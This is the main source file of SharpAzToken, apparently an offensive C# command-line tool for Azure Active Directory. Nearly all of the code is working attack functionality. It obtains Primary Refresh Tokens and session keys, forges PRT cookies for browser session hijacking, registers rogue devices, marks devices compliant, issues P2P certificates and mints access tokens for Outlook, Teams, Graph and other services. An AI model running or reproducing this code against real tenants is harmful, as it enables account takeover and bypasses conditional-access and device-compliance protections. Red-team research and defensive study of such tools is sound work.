using CommandLine;
using CommandLine.Text;
using JWT;
using JWT.Serializers;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace SharpAzToken
{

   

    class Program
    {
        static void PrintBanner()
        {
            String banner = @"
  _________.__                           _____         ___________     __                  
 /   _____/|  |__ _____ _____________   /  _  \ _______\__    ___/___ |  | __ ____   ____  
 \_____  \ |  |  \\__  \\_  __ \____ \ /  /_\  \\___   / |    | /  _ \|  |/ // __ \ /    \ 
 /        \|   Y  \/ __ \|  | \/  |_> >    |    \/    /  |    |(  <_> )    <\  ___/|   |  \
/_______  /|___|  (____  /__|  |   __/\____|__  /_____ \ |____| \____/|__|_ \\___  >___|  /
        \/      \/     \/      |__|           \/      \/                   \/    \/     \/ ";
            Console.WriteLine("");
            Console.WriteLine(banner);
            Console.WriteLine("");
        }


        static int DisplayHelp(ParserResult<object> parserResult)
        {
            Console.WriteLine(HelpText.AutoBuild(parserResult, h => {
                h.AdditionalNewLineAfterOption = false;
                h.Heading = "SharpAzToken 0.0.2"; //change header
                h.Copyright = ""; //change copyright text
                return h;
            }));
            return 1;
        }

        static int Main(string[] args)
        {
            PrintBanner();
            var parserResult = new Parser(c => c.HelpWriter = null).ParseArguments<P2POptions, NonceOptions, CookieOptions, TokenOptionsV1, TokenOptionsV2, DeviceOptions, DeviceKeyOptions, UtilsOptions>(args);
            return parserResult.MapResult(
                    (P2POptions options) => RunP2PAction(options),
                    (DeviceKeyOptions options) => RunDeviceKeys(options),
                    (DeviceOptions options) => RunDevice(options),
                    (NonceOptions options) => RunNonce(options),
                    (CookieOptions options) => RunCookie(options),
                    (TokenOptionsV1 options) => RunTokenV1(options),
                    (TokenOptionsV2 options) => RunTokenV2(options),
                    (UtilsOptions options) => RunUtils(options),
                    errs => DisplayHelp(parserResult)
            );
        }

        private static int RunP2PAction(P2POptions opts)
        {
            String result = null;
            RSA rsa;
            bool t = (opts.Context != null & opts.DerivedKey != null) | (opts.SessionKey != null);
            if (opts.PRT != null && ((opts.Context != null & opts.DerivedKey != null)|(opts.SessionKey != null)) && opts.UserName != null)
            {
                String tenant = null;
                if(opts.Tenant != null)
                {
                    tenant = opts.Tenant;
                }
                else
                {
                    tenant = Utils.GetTenantIdToUPN(opts.UserName, opts.Proxy);
                }
                rsa = new RSACng(2048);
                string CN = "CN=" + opts.UserName;
                CertificateRequest req = new System.Security.Cryptography.X509Certificates.CertificateRequest(CN, rsa, System.Security.Cryptography.HashAlgorithmName.SHA256, System.Security.Cryptography.RSASignaturePadding.Pkcs1);
                var csr = Convert.ToBase64String(req.CreateSigningRequest());
                string nonce = Helper.GetNonce2(opts.Proxy);
                String derivedSessionKey;
                Dictionary<string, object> headerRaw;
                if (opts.Context != null && opts.DerivedKey != null)
                {
                    var ctx = Helper.Hex2Binary(opts.Context);
                    headerRaw = new Dictionary<string, object>
                    {
                        { "ctx", ctx }
                    };
                    derivedSessionKey = opts.DerivedKey;
                }
                else
                {
                    var context = Helper.GetByteArray(24);
                    var decodedKey = Helper.Base64Decode(opts.SessionKey);
                    var derivedKey = Helper.CreateDerivedKey(decodedKey, context);
                    derivedSessionKey = Helper.Binary2Hex(derivedKey);
                    headerRaw = new Dictionary<string, object>
                    {
                        { "ctx", context }
                    };
                }
                byte[] data = Helper.Base64Decode(opts.PRT);
                string prtdecoded = Encoding.UTF8.GetString(data);

                Dictionary<string, object> payload = new Dictionary<string, object>
                {
                    { "iss", "aad:brokerplugin" },
                    { "aud", "login.microsoftonline.com" },
                    { "grant_type", "refresh_token" },
                    { "request_nonce", nonce },
                    { "scope", "openid aza ugs" },
                    { "refresh_token", prtdecoded },
                    { "client_id", "38aa3b87-a06d-4817-b275-7a316988d93b"},
                    { "cert_token_use", "user_cert" },
                    { "csr_type", "http://schemas.microsoft.com/windows/pki/2009/01/enrollment#PKCS10" },
                    { "csr", csr },
                    { "prt_protocol_version", "3.8"}
                };

                
                var JWT = Helper.signJWT(headerRaw, payload, derivedSessionKey);
                result = Tokenator.GetP2PCertificate(JWT, opts.Tenant, opts.Proxy);
                
            }
            else if (opts.PFXPath != null && opts.Tenant != null && opts.DeviceName != null)
            {
                
                X509Certificate2 cert = new X509Certificate2(opts.PFXPath, opts.PFXPassword, X509KeyStorageFlags.Exportable);
                rsa = cert.GetRSAPrivateKey();
                var x5c = Convert.ToBase64String(cert.Export(X509ContentType.Cert));
                var CN = cert.Subject;
                CertificateRequest req = new CertificateRequest(CN, rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
                var csr = Convert.ToBase64String(req.CreateSigningRequest());

                string nonce = Helper.GetNonce2(opts.Proxy);

                Dictionary<string, string> headerRaw = new Dictionary<string, string>
                    {
                        { "alg", "RS256" },
                        { "typ", "JWT" },
                        { "x5c", x5c }
                    };

                string headerRawString = JsonConvert.SerializeObject(headerRaw, Formatting.None);
                var header = Helper.Base64UrlEncode(System.Text.Encoding.UTF8.GetBytes(headerRawString));

                var dnsNames = new List<string>();
                dnsNames.Add(opts.DeviceName);

                Dictionary<string, object> rawPayload = new Dictionary<string, object>
                    {
                        { "request_nonce", nonce },
                        { "win_ver", "10.0.18363.0" },
                        { "grant_type", "device_auth" },
                        { "cert_token_use", "device_cert" },
                        { "client_id", "38aa3b87-a06d-4817-b275-7a316988d93b" },
                        { "csr_type", "http://schemas.microsoft.com/windows/pki/2009/01/enrollment#PKCS10" },
                        { "csr",  csr },
                        { "netbios_name", "JuniTest" },
                        { "dns_names", dnsNames }
                    };

                string rawPayloadString = JsonConvert.SerializeObject(rawPayload, Formatting.None);
                var payload = Helper.Base64UrlEncode(System.Text.Encoding.UTF8.GetBytes(rawPayloadString));

                var dataBin = System.Text.Encoding.UTF8.GetBytes(header + "." + payload);

                var signature = rsa.SignData(dataBin, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
                var signatureb64 = Helper.Base64UrlEncode(signature);

                var JWT = header + "." + payload + "." + signatureb64;

                result = Tokenator.GetP2PCertificate(JWT, opts.Tenant, opts.Proxy);
            }
            else 
            {
                Console.WriteLine("[-] Use --prt ((--derivedkey --context) or (--sessionkey)) --username or with --pfxpath --tenant --devicename.... Other methods are not implemented yet...");
                return 1;
            }

            if (result != null)
            {
                JToken parsedResult = JToken.Parse(result);

                var binCert = Convert.FromBase64String(parsedResult["x5c"].ToString());

                X509Certificate2 cert = new X509Certificate2(binCert, "", X509KeyStorageFlags.PersistKeySet | X509KeyStorageFlags.Exportable);
                string deviceId = cert.Subject.Split("=")[1];
                deviceId = deviceId.Split(",")[0];
                var keyPair = cert.CopyWithPrivateKey(rsa);
                byte[] certData = keyPair.Export(X509ContentType.Pfx, opts.PFXPassword);
                File.WriteAllBytes(deviceId + "-P2P.pfx", certData);

                String certHeader = "-----BEGIN PUBLIC KEY-----\n";
                String certend = "\n-----END PUBLIC KEY-----";

                string caCert = certHeader + parsedResult["x5c_ca"].ToString() + certend;
                File.WriteAllText(deviceId + "-P2P-CA.der", caCert);

                Console.WriteLine();
                Console.WriteLine("[+] Subject: " + cert.Subject);
                Console.WriteLine("[+] Issuer: " + cert.Issuer);
                Console.WriteLine("[+] CA file name: " + deviceId + "-P2P-CA.der");
                Console.WriteLine("[+] PFX file name: " + deviceId + "-P2P.pfx");
                return 0;
            } 
            return 1;
        }

        static int RunDeviceKeys(DeviceKeyOptions opts)
        {
            String refreshtoken = null;
            string tenantId = null;
            var serializer = new JsonNetSerializer();
            var urlEncoder = new JwtBase64UrlEncoder();
            var decoder = new JwtDecoder(serializer, urlEncoder);
            if (opts.RefreshToken != null)
            {
                string initToken = Tokenator.GetTokenFromRefreshTokenV1(opts.RefreshToken, opts.Tenant, opts.Proxy, AzClientIDEnum.AzureMDM, AzResourceEnum.AzureMDM);
                string checkAccessToken = JToken.Parse(initToken)["access_token"].ToString();
                string decodedaccesstoken = decoder.Decode(checkAccessToken);
                JToken parsedAccessToken = JToken.Parse(decodedaccesstoken);
                String aud = parsedAccessToken["aud"].ToString();
                tenantId = parsedAccessToken["tid"].ToString();
                if (aud != AzResourceEnum.AzureMDM)
                {
                    Console.WriteLine("[-] AccessToken does not contain correct Audience...");
                    return 1;
                }
                refreshtoken = opts.RefreshToken;
            }
            else if (opts.UserName != null && opts.Password != null)
            {
                String initTokens = Tokenator.GetTokenFromUsernameAndPasswordV1(opts.UserName, opts.Password, opts.Tenant, opts.Proxy, AzClientIDEnum.AzureMDM, AzResourceEnum.AzureMDM);
                if (initTokens == null)
                {
                    Console.WriteLine("[-] Authentication failed. Please check used credentials!");
                    return 1;
                }
                JToken parsedInitToken = JToken.Parse(initTokens);
                tenantId = Helper.GetTenantFromAccessToken(parsedInitToken["access_token"].ToString());
                refreshtoken = parsedInitToken["refresh_token"].ToString();               
            } else
            {
                Console.WriteLine("[-] For this you need a username and a password");
                Console.WriteLine("");
                return 1;
            }

            if (refreshtoken != null && tenantId != null)
            {
                X509Certificate2 cert = new X509Certificate2(opts.PFXPath, "", X509KeyStorageFlags.Exportable);
                var privateKey = cert.GetRSAPrivateKey();
                var x5c = Convert.ToBase64String(cert.Export(X509ContentType.Cert));

                string nonce = Helper.GetNonce2(opts.Proxy);

                Dictionary<string, string> headerRaw = new Dictionary<string, string>
                    {
                        { "alg", "RS256" },
                        { "typ", "JWT" },
                        { "x5c", x5c }
                    };

                string headerRawString = JsonConvert.SerializeObject(headerRaw, Formatting.None);
                var header = Helper.Base64UrlEncode(System.Text.Encoding.UTF8.GetBytes(headerRawString));

                Dictionary<string, string> rawPayload = new Dictionary<string, string>
                    {
                        { "request_nonce", nonce },
                        { "scope", "openid aza ugs" },
                        { "win_ver", "10.0.18363.0" },
                        { "grant_type", "refresh_token" },
                        { "refresh_token", refreshtoken },
                        { "client_id", AzClientIDEnum.AzureMDM }
                    };

                string rawPayloadString = JsonConvert.SerializeObject(rawPayload, Formatting.None);
                var payload = Helper.Base64UrlEncode(System.Text.Encoding.UTF8.GetBytes(rawPayloadString));

                var dataBin = System.Text.Encoding.UTF8.GetBytes(header + "." + payload);

                var signature = privateKey.SignData(dataBin, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
                var signatureb64 = Helper.Base64UrlEncode(signature);

                var JWT = header + "." + payload + "." + signatureb64;

                var formContent = new FormUrlEncodedContent(new[]
                   {
                    new KeyValuePair<string, string>("windows_api_version", "2.0"),
                    new KeyValuePair<string, string>("grant_type", "urn:ietf:params:oauth:grant-type:jwt-bearer"),
                    new KeyValuePair<string, string>("request", JWT),
                    new KeyValuePair<string, string>("client_info", "2")
                    });

                string result = Helper.PostToTokenEndpoint(formContent, opts.Proxy, tenantId);
                JToken parsedResult = JToken.Parse(result);
                
                if (parsedResult["refresh_token"] != null && parsedResult["session_key_jwe"] != null)
                {
                    string PRT = parsedResult["refresh_token"].ToString();
                    string JWE = parsedResult["session_key_jwe"].ToString();
                    string[] JWESplitted = JWE.Split(".");
                    byte[] encKey = Helper.Base64Decode(JWESplitted[1]);
                    var formatter = new System.Security.Cryptography.RSAOAEPKeyExchangeDeformatter(privateKey);
                    var dekey = formatter.DecryptKeyExchange(encKey);
                    string decryptionKey = Convert.ToBase64String(dekey);

                    Console.WriteLine();
                    Console.WriteLine("[+] Here is your PRT:");
                    Console.WriteLine();
                    Console.WriteLine(Convert.ToBase64String(Encoding.ASCII.GetBytes(PRT)));
                    Console.WriteLine();
                    Console.WriteLine("[+] Here is your session key:");
                    Console.WriteLine();
                    Console.WriteLine(decryptionKey);
                    Console.WriteLine("");

                    return 0;
                }
                else if (parsedResult["error_description"] != null)
                {
                    Console.WriteLine();
                    Console.WriteLine("[-] Something went wrong:");
                    Console.WriteLine();
                    Console.WriteLine(parsedResult["error_description"].ToString());
                    Console.WriteLine("");
                    return 1;
                }else
                {
                    Console.WriteLine();
                    Console.WriteLine("[-] Something went completly wrong... sorry");
                    Console.WriteLine();

                    return 1;
                }          
            }
            else
            {
                Console.WriteLine();
                Console.WriteLine("[-] Something went completly wrong... sorry");
                Console.WriteLine();
                return 1;
            }
        }

        static int RunDevice(DeviceOptions opts)
        {
            String accesstoken = null;
            String upn = null;
            string tenantId = null;
            var serializer = new JsonNetSerializer();
            var urlEncoder = new JwtBase64UrlEncoder();
            var decoder = new JwtDecoder(serializer, urlEncoder);
            if (opts.JoinDevice) {
                if (opts.DeviceName != null)
                {
                    if (opts.AccessToken != null)
                    {

                        string decodedaccesstoken = decoder.Decode(opts.AccessToken);
                        JToken parsedAccessToken = JToken.Parse(decodedaccesstoken);
                        String aud = parsedAccessToken["aud"].ToString();
                        tenantId = parsedAccessToken["tid"].ToString();
                        upn = parsedAccessToken["upn"].ToString();
                        if (aud != AzClientIDEnum.DeviceMgmt)
                        {
                            Console.WriteLine("AccessToken does not contain correct Audience...");
                            return 1;
                        }
                        accesstoken = opts.AccessToken;
                    }
                    else
                    {
                        String token = Tokenator.GetTokenFromUsernameAndPasswordV1(opts.UserName, opts.Password, opts.Tenant, opts.Proxy, AzClientIDEnum.GraphAPI, AzResourceEnum.WindowsClient);
                        if (token == null)
                        {
                            Console.WriteLine("[-] Authentication failed! ");
                            return 1;
                        }
                        JToken parsedInitToken = JToken.Parse(token);
                        if (parsedInitToken["error"] != null)
                        {
                            Console.WriteLine("[-] Something went wrong!");
                            Console.WriteLine("");
                            var beautified = parsedInitToken.ToString(Formatting.Indented);
                            Console.WriteLine(beautified);
                            Console.WriteLine("");
                            Console.WriteLine("[-] Good bye!");
                            return 1;
                        }
                        String initAccesstoken = decoder.Decode(parsedInitToken["access_token"].ToString());
                        var parsedInitAccessToken = JToken.Parse(initAccesstoken);
                        tenantId = parsedInitAccessToken["tid"].ToString();
                        upn = parsedInitAccessToken["upn"].ToString();
                        JToken parsedTokenForDevMgmt = JToken.Parse(token);
                        accesstoken = parsedTokenForDevMgmt["access_token"].ToString();
                    }
                    if (accesstoken != null && upn != null && tenantId != null)
                    {

                        // https://github.com/Gerenios/AADInternals/blob/23831d5af045eeaa199ab098d29df9d4a60f460e/PRT_Utils.ps1#L95
                        RSACng rsa = new RSACng(2048);
                        string CN = "CN=7E980AD9-B86D-4306-9425-9AC066FB014A";
                        CertificateRequest req = new System.Security.Cryptography.X509Certificates.CertificateRequest(CN, rsa, System.Security.Cryptography.HashAlgorithmName.SHA256, System.Security.Cryptography.RSASignaturePadding.Pkcs1);
                        var crs = Convert.ToBase64String(req.CreateSigningRequest());
                        var transportKey = Convert.ToBase64String(rsa.Key.Export(CngKeyBlobFormat.GenericPublicBlob));
                        var responseJoinDevice = MEManager.addNewDeviceToAzure(opts.Proxy, accesstoken, crs, transportKey, upn.Split("@")[1], opts.DeviceName, opts.RegisterDevice);
                        byte[] binCert = Convert.FromBase64String(responseJoinDevice.Certificate.RawBody.ToString());
                        X509Certificate2 cert = new X509Certificate2(binCert, "", X509KeyStorageFlags.UserKeySet | X509KeyStorageFlags.Exportable);

                        string deviceId = cert.Subject.Split("=")[1];
                        Console.WriteLine("[+]Device successfull added to Azure");
                        Console.WriteLine("");
                        Console.WriteLine("[+] The deviceId is: " + deviceId);
                        Console.WriteLine("");
                        Console.WriteLine(JToken.FromObject(responseJoinDevice).ToString(Formatting.Indented));
                        Console.WriteLine("");

                        // https://github.com/dotnet/runtime/issues/19581
                        var keyPair = cert.CopyWithPrivateKey(rsa);
                        byte[] certData = keyPair.Export(X509ContentType.Pfx, "");
                        File.WriteAllBytes(deviceId + ".pfx", certData);

                        Console.WriteLine("Device Certificate written to " + deviceId + ".pfx");
                        Console.WriteLine("");
                        return 0;
                    }
                }
                else
                {
                    Console.WriteLine("[-] You must set a device name (--devicename).");
                    return 1;
                }
            }else if (opts.MarkCompliant)
            {
                if (opts.ObjectID != null)
                {
                    if (opts.AccessToken != null)
                    {
                        int result = 0;
                        result = MEManager.MarkDeviceAsCompliant(opts.ObjectID, opts.AccessToken, opts.Proxy);
                        Console.WriteLine("[+] Responsecode is: " + result.ToString());
                        return 0;
                    }
                    else
                    {
                        Console.WriteLine("[-] This is currently only implemented with --accesstoken, get the correct token with --clientname Graph");
                        return 1;
                    }
                }
                else
                {
                    Console.WriteLine("[-] You must set an ObjectId id (--objectid)");
                    return 1;
                }
            }
            else
            {
                Console.WriteLine("[-] Please specify an action --joindevice or --markcompliant");
                return 1;
            }

            return 1;
        }

        static int Error() {
            Console.WriteLine("Please specify an action and options!");
            Console.WriteLine(" ");
            return 1;
        
        }

        static int RunNonce(NonceOptions opts)
        {

            Console.WriteLine(Helper.getNonce(opts.Proxy));
            Console.WriteLine("");
            return 0;
        }

        static int RunCookie(CookieOptions opts)
        {
            string PRTCookie = null;
            if (opts.PRT != null && opts.DerivedKey != null && opts.Context != null)
            {
                PRTCookie = Helper.createPRTCookie(opts.PRT, opts.Context, opts.DerivedKey, opts.Proxy);
            }
            else if (opts.PRT != null & opts.SessionKey != null)
            {
                var context = Helper.GetByteArray(24);
                var decodedKey = Helper.Base64Decode(opts.SessionKey);
                var derivedKey = Helper.CreateDerivedKey(decodedKey, context);

                var contextHex = Helper.Binary2Hex(context);
                var derivedSessionKeyHex = Helper.Binary2Hex(derivedKey);

                PRTCookie = Helper.createPRTCookie(opts.PRT, contextHex, derivedSessionKeyHex, opts.Proxy);
            }
            else
            {
                Console.WriteLine("Please set the corect arguments.");
                return 1;
            }

            Console.WriteLine("[+] Here is your PRT-Cookie:");
            Console.WriteLine("");
            Console.WriteLine(PRTCookie);
            Console.WriteLine("");
            Console.WriteLine("[+] You can use it with this tool or add it to a browser.");
            Console.WriteLine("[+] Set as cookie \"x-ms-RefreshTokenCredential\" with HTTPOnly flag");
            Console.WriteLine("");

            return 0;
        }

        static int RunUtils(UtilsOptions opts)
        {
            if (opts.Domain != null)
            {
                String result = null;
                result = Utils.GetTenantIdToDomain(opts.Domain, opts.Proxy);
                if (result != null)
                {
                    Console.WriteLine("[+] The TenantID is: " + result);
                }
                else
                {
                    Console.WriteLine("[-] It seems the domain does not exist.");
                }
                return 0;
            }
            return 1;
        }

        static int RunTokenV1(TokenOptionsV1 opts)
        {

            if (opts.ClientName != null)
            {
                switch (opts.ClientName)
                {
                    case "Outlook":
                        opts.ClientID = AzClientIDEnum.MicrosoftOffice;
                        opts.ResourceID = AzResourceEnum.Outlook;
                        break;
                    case "Substrate":
                        opts.ClientID = AzClientIDEnum.Substrate;
                        opts.ResourceID = AzResourceEnum.Substrate;
                        break;
                    case "Teams":
                        opts.ClientID = AzClientIDEnum.Teams;
                        opts.ResourceID = AzResourceEnum.Teams;
                        break;
                    case "Graph":
                        opts.ClientID = AzClientIDEnum.GraphAPI;
                        opts.ResourceID = AzResourceEnum.GraphAPI;
                        break;
                    case "MSGraph":
                        opts.ClientID = AzClientIDEnum.MSGraph;
                        opts.ResourceID = AzResourceEnum.MSGraph;
                        break;
                    case "Core":
                        opts.ClientID = AzClientIDEnum.Core;
                        opts.ResourceID = AzResourceEnum.Core;
                        break;
                    case "Office":
                        opts.ClientID = AzClientIDEnum.OfficeApps;
                        opts.ResourceID = AzResourceEnum.OfficeApps;
                        break;
                    case "Intune":
                        opts.ClientID = AzClientIDEnum.Intune;
                        opts.ResourceID = AzResourceEnum.Intune;
                        break;
                    case "Windows":
                        opts.ClientID = AzClientIDEnum.WindowsClient;
                        opts.ResourceID = AzResourceEnum.WindowsClient;
                        break;
                    case "AzureMDM":
                        opts.ClientID = AzClientIDEnum.AzureMDM;
                        opts.ResourceID = AzResourceEnum.AzureMDM;
                        break;
                    case "ComplianceCenter":
                        opts.ClientID = AzClientIDEnum.ExchangeOnlinePowerShell;
                        opts.ResourceID = AzResourceEnum.Core;
                        break;
                    case "ExchangeOnlineV2":
                        opts.ClientID = AzClientIDEnum.ExchangeOnlinePowerShell;
                        break;
                    case "SharepointOnline":
                        break;
                    default:
                        Console.WriteLine("[-] Please choose Outlook, Substrate, Teams, Graph, MSGraph, Webshell, Core, Office, Intune, AzureMDM or WinClient");
                        return 1;
                }
            }

            if(opts.ClientName == "SharepointOnline")
            {
                if (opts.ResourceID == null )
                {
                    Console.WriteLine("[-] Please specify your sharepoint url in the parameter --resourceid with the pattern: https://<Your-Sharepoint>.sharepoint.com!");
                    return 1;
                } else if (!opts.ResourceID.EndsWith(".sharepoint.com") | !opts.ResourceID.StartsWith("https://")){
                    Console.WriteLine("[-] Please specify your sharepoint url in the parameter --resourceid with the pattern: https://<Your-Sharepoint>.sharepoint.com!");
                    return 1;
                }
            }

            String result = Tokenator.getTokenV1(opts);
            if (result != null)
            {
                var serializer = new JsonNetSerializer();
                var urlEncoder = new JwtBase64UrlEncoder();
                var decoder = new JwtDecoder(serializer, urlEncoder);
                JToken parsedJson = JToken.Parse(result);

                if (parsedJson["error"] != null)
                {
                    Console.WriteLine("[-] Something went wrong!");
                    Console.WriteLine("");
                    
                    Console.WriteLine(parsedJson["error_description"].ToString());
                    Console.WriteLine("");
                    return 1;
                }
                                
                if (parsedJson["id_token"] != null)
                {
                    var id_token = decoder.Decode(parsedJson["id_token"].ToString());
                    var parsedIDToken = JToken.Parse(id_token);
                    parsedJson["id_token"] = parsedIDToken;
                }

                Console.WriteLine("[+] Here is your token:");
                Console.WriteLine("");
                var beautified = parsedJson.ToString(Formatting.Indented);
                Console.WriteLine(beautified);
                Console.WriteLine("");

                return 0;
            }
            return 1;
        }

        static int RunTokenV2(TokenOptionsV2 opts)
        {

            if (opts.ClientName != null)
            {
                switch (opts.ClientName)
                {
                    case "Outlook":
                        opts.ClientID = AzClientIDEnum.MicrosoftOffice;
                        opts.Scope = AzScopes.Default;
                        break;
                    case "Substrate":
                        opts.ClientID = AzClientIDEnum.Substrate;
                        opts.Scope = AzScopes.Default;
                        break;
                    case "Teams":
                        opts.ClientID = AzClientIDEnum.Teams;
                        opts.Scope = AzScopes.Default;
                        break;
                    case "Graph":
                        opts.ClientID = AzClientIDEnum.GraphAPI;
                        opts.Scope = AzScopes.Default;
                        break;
                    case "MSGraph":
                        opts.ClientID = AzClientIDEnum.MSGraph;
                        opts.Scope = AzScopes.Default;
                        break;
                    case "Core":
                        opts.ClientID = AzClientIDEnum.Core;
                        opts.Scope = AzScopes.Default;
                        break;
                    case "Office":
                        opts.ClientID = AzClientIDEnum.OfficeApps;
                        opts.Scope = AzScopes.Default;
                        break;
                    case "Intune":
                        opts.ClientID = AzClientIDEnum.Intune;
                        opts.Scope = AzScopes.Default;
                        break;
                    case "Windows":
                        opts.ClientID = AzClientIDEnum.WindowsClient;
                        opts.Scope = AzScopes.Default;
                        break;
                    case "AzureMDM":
                        opts.ClientID = AzClientIDEnum.AzureMDM;
                        opts.Scope = AzScopes.Default;
                        break;
                    case "ComplianceCenter":
                        opts.ClientID = AzClientIDEnum.ExchangeOnlinePowerShell;
                        opts.Scope = AzScopes.ComplianceCenter;
                        break;
                    case "ExchangeOnlineV2":
                        opts.ClientID = AzClientIDEnum.ExchangeOnlinePowerShell;
                        break;
                    default:
                        Console.WriteLine("[-] Please choose Outlook, Substrate, Teams, Graph, MSGraph, Webshell, Core, Office, Intune, AzureMDM or WinClient");
                        return 1;
                }
            }

            String result = Tokenator.getTokenV2(opts);
            if (result != null)
            {
                var serializer = new JsonNetSerializer();
                var urlEncoder = new JwtBase64UrlEncoder();
                var decoder = new JwtDecoder(serializer, urlEncoder);
                JToken parsedJson = JToken.Parse(result);

                if (parsedJson["error"] != null)
                {
                    Console.WriteLine("[-] Something went wrong!");
                    Console.WriteLine("");

                    Console.WriteLine(parsedJson["error_description"].ToString());
                    Console.WriteLine("");
                    return 1;
                }

                if (parsedJson["id_token"] != null)
                {
                    var id_token = decoder.Decode(parsedJson["id_token"].ToString());
                    var parsedIDToken = JToken.Parse(id_token);
                    parsedJson["id_token"] = parsedIDToken;
                }

                Console.WriteLine("[+] Here is your token:");
                Console.WriteLine("");
                var beautified = parsedJson.ToString(Formatting.Indented);
                Console.WriteLine(beautified);
                Console.WriteLine("");

                return 0;
            }
            return 1;
        }

    }
}
